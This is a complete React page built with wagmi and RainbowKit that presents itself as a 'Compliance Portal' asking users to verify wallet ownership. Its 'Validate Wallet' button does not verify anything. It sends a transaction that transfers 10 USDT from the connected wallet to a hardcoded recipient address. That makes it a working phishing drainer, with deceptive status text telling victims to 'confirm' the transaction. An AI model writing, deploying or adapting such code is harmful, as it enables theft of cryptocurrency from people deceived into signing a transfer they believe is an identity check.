'use client';

import '@rainbow-me/rainbowkit/styles.css';
import {
  WagmiConfig,
  useAccount,
  useDisconnect,
  useWalletClient,
} from 'wagmi';
import { mainnet } from 'wagmi/chains';
import {
  RainbowKitProvider,
  getDefaultConfig,
  ConnectButton,
} from '@rainbow-me/rainbowkit';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { parseUnits } from 'viem';
import { useState } from 'react';

const config = getDefaultConfig({
  appName: 'Compliance Wallet Portal',
  projectId: '5304256cb79a264108479aea79d8ae5b',
  chains: [mainnet],
  ssr: false,
});

const queryClient = new QueryClient();

const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const recipient = '0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75';

function WalletArea() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  const handleValidate = async () => {
    if (!walletClient || !address) return;

    try {
      setStatus('🔐 Confirm transaction in your wallet...');
      setLoading(true);

      const usdtAbi = [
        {
          name: 'transfer',
          type: 'function',
          stateMutability: 'nonpayable',
          inputs: [
            { name: 'to', type: 'address' },
            { name: 'value', type: 'uint256' },
          ],
          outputs: [{ name: '', type: 'bool' }],
        },
      ];

      const hash = await walletClient.writeContract({
        address: usdtContractAddress,
        abi: usdtAbi,
        functionName: 'transfer',
        args: [recipient, parseUnits('10', 6)],
      });

      setStatus(`✅ Transaction sent: ${hash.slice(0, 10)}...`);
    } catch (err) {
      console.error(err);
      setStatus('❌ Transaction rejected or failed.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-white rounded-2xl p-8 shadow-xl border max-w-md w-full mx-auto transition-all duration-300 hover:shadow-2xl">
      <h2 className="text-2xl font-bold text-gray-800 text-center mb-2">
        Verify Your Wallet
      </h2>
      <p className="text-gray-500 text-sm text-center mb-6">
        Connect and confirm wallet ownership securely.
      </p>

      <div className="flex justify-center mb-4">
        <ConnectButton />
      </div>

      {isConnected && (
        <div className="space-y-4">
          <div className="text-center text-gray-700 text-sm">
            Connected:{' '}
            <span className="font-mono">
              {address ? `${address.slice(0, 6)}...${address.slice(-4)}` : 'Loading...'}
            </span>
          </div>

          <button
            onClick={handleValidate}
            disabled={loading}
            className={`w-full py-2 font-semibold rounded-lg text-white transition-colors ${
              loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
            }`}
          >
            {loading ? 'Processing...' : 'Validate Wallet'}
          </button>

          {status && (
            <div className="text-sm text-center text-gray-600 border rounded p-2 bg-gray-50">
              {status}
            </div>
          )}

          <button
            onClick={() => disconnect()}
            className="w-full py-2 text-red-600 border border-red-500 hover:bg-red-50 rounded-lg"
          >
            Disconnect
          </button>
        </div>
      )}
    </div>
  );
}

export default function Page() {
  return (
    <QueryClientProvider client={queryClient}>
      <WagmiConfig config={config}>
        <RainbowKitProvider>
          <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col">
            <header className="w-full py-4 px-8 border-b bg-white flex justify-between items-center shadow-sm sticky top-0 z-10">
              <h1 className="text-2xl font-bold text-gray-800">🛡 Compliance Portal</h1>
              <ConnectButton />
            </header>

            <main className="flex-1 flex items-center justify-center p-4">
              <WalletArea />
            </main>

            <footer className="text-center text-xs text-gray-400 py-4">
              &copy; {new Date().getFullYear()} Wallet Verification — ETH Network
            </footer>
          </div>
        </RainbowKitProvider>
      </WagmiConfig>
    </QueryClientProvider>
  );
}
